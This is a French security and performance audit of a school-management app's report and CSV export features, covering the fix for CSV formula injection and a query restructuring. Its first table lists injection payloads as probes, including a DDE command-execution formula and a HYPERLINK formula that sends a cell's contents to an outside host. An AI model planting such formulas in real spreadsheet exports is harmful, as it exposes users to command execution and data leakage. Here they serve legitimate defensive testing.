# Audit de la phase 9C — rapports et exports

**Date** : 28 septembre 2026
**Méthode** : audit **par exécution**. Chaque constat a été produit par une
sonde, sur des données réelles ou sur un volume fabriqué pour l'occasion,
avant toute correction.

---

## Le contrôle qui prime

```
bash tests/installation_zero.sh --oui
```

→ 78 permissions, 310 role_permissions, école neuve créée puis retirée.
**Le produit s'installe toujours depuis zéro.**

---

## Défaut 1 — le CSV transportait des formules exécutables

C'est le défaut le plus grave de cet audit, et il était dans ce que la
9C venait de livrer.

Excel et LibreOffice interprètent comme une **formule** toute cellule
commençant par `=`, `+`, `-`, `@`, une tabulation ou un retour chariot.
Le guillemet du CSV n'y change rien : `"=1+1"` est évalué.

Or les noms de classes, d'élèves et d'établissements sont **saisis par
l'école**. Mesuré sur l'export livré — sept charges sur sept passaient
intactes :

| Charge | Avant |
|---|---|
| `=1+1` | **interprétée** |
| `=cmd\|'/c calc'!A1` | **interprétée** — exécution de commande sur d'anciennes versions |
| `+1+1`, `-1+1`, `@SUM(A1:A9)` | **interprétées** |
| tabulation puis `=1+1` | **interprétée** |
| `=HYPERLINK("http://ailleurs.cd?d="&A1;"Cliquez")` | **interprétée** — exfiltration d'une autre cellule |

Le scénario n'a rien de théorique : un secrétariat nomme une classe,
le directeur exporte les effectifs pour sa tutelle, ouvre le fichier,
clique.

> Une donnée saisie par un utilisateur et rendue dans un tableur n'est
> pas du texte : c'est du code tant qu'on ne l'a pas désarmé.

**Correction** : `csv_safe_cell()` dans le noyau, appliquée à **chaque
cellule, en-têtes comprises**.

### Le même trou existait depuis la phase 5

L'export des impayés (`finance_build_outstanding_csv`) écrivait des noms
d'élèves saisis par l'école, sans neutralisation. Corrigé par la même
fonction — une seule règle pour tous les exports du produit.

### La neutralisation épargne les nombres

Préfixer `-1250,00` en ferait du texte, et la colonne ne s'additionnerait
plus dans Excel : on casserait le fichier pour se protéger d'un danger
qui n'existe pas sur un nombre. Vérifié : `-1250,00`, `8`, `20,0` passent
intacts ; `5ème primaire A` aussi.

---

## Défaut 2 — une affirmation de performance jamais mesurée

Le fichier `repositories.php` s'ouvrait sur « une requête par rapport,
pas une par classe ». Vrai, et insuffisant : **je n'avais jamais mesuré
ce que ces requêtes coûtent.**

Volume fabriqué — une école ordinaire, pas un cas limite :
**61 classes, 2 408 inscriptions, 7 208 bulletins, 94 720 pointages.**

| Rapport | Avant |
|---|---|
| effectifs | 11,0 ms |
| résultats | 11,4 ms |
| **assiduité** | **879,3 ms** |
| assiduité, 7 jours | 156,5 ms |

Près d'une seconde pour une seule école, et le chiffre **croît avec
l'année** : en juin, trois fois pire.

### Ce que la mesure a désigné, contre mon intuition

Le plan d'exécution était bon, les index utilisés. J'ai d'abord soupçonné
le `COUNT(DISTINCT)`. En isolant :

```
  fonction réelle du produit                 831 ms
  … sans les jointures du référentiel        110 ms
```

Ce sont les jointures `curriculums → education_levels →
education_cycles` — **qui n'apportent qu'un libellé** — que MySQL faisait
traverser par les 95 000 lignes de pointage. Les effectifs et les
résultats ne le payaient pas parce qu'ils agrègent dix fois moins de
lignes : le défaut était le même, seule la facture différait.

> Une jointure qui n'apporte qu'un libellé n'a rien à faire dans la
> requête qui compte : on agrège d'abord, on décore ensuite.

**Correction** : un **squelette de classes** partagé
(`reports_repo_classrooms`) porte identité, niveau, cycle et ordre ; les
trois rapports agrègent sans le référentiel, puis `reports_repo_merge()`
recolle. L'assiduité passe en outre à deux agrégations séparées — compter
des séances et compter des pointages sont deux questions de granularité
différente.

| Rapport | Avant | Après |
|---|---|---|
| effectifs | 11,0 ms | **7,2 ms** |
| résultats | 11,4 ms | **10,3 ms** |
| assiduité | 879,3 ms | **100,9 ms** |
| assiduité, 7 jours | 156,5 ms | **27,5 ms** |

### La vitesse ne vaut rien si les chiffres changent

Les trois rapports ont été **recoupés contre un comptage direct** sur le
volume :

```
  EFFECTIFS  rapport G=1204 F=1204 tot=2408  |  direct G=1204 F=1204 tot=2408   ✓
  ASSIDUITÉ  séances=2400 pointages=94720 prés=72341 abs=9472 ret=12907        ✓
  RÉSULTATS  bull=2408 décidés=1800 sans=608 réuss=1800                        ✓
```

Et les 55 tests existants sont passés **sans modification** après la
restructuration.

---

## Un bénéfice que je n'avais pas prévu : les classes vides

Les agrégats étant désormais recollés à un squelette, une classe sans
élève, sans bulletin ou sans pointage **reste une ligne**, avec des
zéros. L'ancienne forme la faisait apparaître par la jointure externe sur
`classrooms` ; la nouvelle le garantit explicitement, et les trois
rapports listent désormais les mêmes classes dans le même ordre.

> Une classe vide est une information, pas une absence.

C'est verrouillé par test.

---

## Ce que l'audit a confirmé plutôt que corrigé

**L'exactitude repose sur trois contraintes d'unicité**, que je n'avais
pas vérifiées avant d'écrire les agrégations :

| Table | Contrainte |
|---|---|
| `bulletins` | `(school_id, enrollment_id, period_key)` |
| `enrollments` | `(student_id, academic_year_id)` |
| `attendance_records` | `(school_id, session_id, enrollment_id)` |

Elles existent toutes les trois — aucun agrégat ne peut compter double.
Un test les assert désormais : si l'une disparaît, il devient rouge ici
plutôt que silencieux dans un état remis à une tutelle.

---

## Vérification

| | |
|---|---|
| `tests/reports_isolation.php` | 55 → **74 tests** |
| Total PHP | **1 164**, 22 suites, 0 échec |
| Total navigateur | **155**, 8 recettes, 0 échec |
| Installation depuis zéro | ✓ |

---

## Fichiers

```
app/core/helpers.php                      (+ csv_safe_cell)
app/modules/reports/repositories.php      (squelette + fusion, 3 rapports)
app/modules/reports/services.php          (désarmement de chaque cellule)
app/modules/finance/controllers.php       (export impayés désarmé)
tests/reports_isolation.php               (55 → 74)
```

---

## Ce qui reste ouvert

1. **Le squelette est relu à chaque rapport.** Trois requêtes de 61
   lignes par page, négligeables aujourd'hui ; à mutualiser si une page
   venait à afficher les trois rapports ensemble.
2. **L'assiduité reste en O(pointages).** 101 ms sur une année complète
   d'une école ; une école à dix mille élèves demanderait une table
   d'agrégats tenue à jour. À mesurer avant de la construire.
3. **Pas de rapport financier consolidé**, pas d'évolution dans le temps,
   pas de rapport par élève — reportés.
4. **`archive.view` reste la dernière permission dormante** — phase 9D.
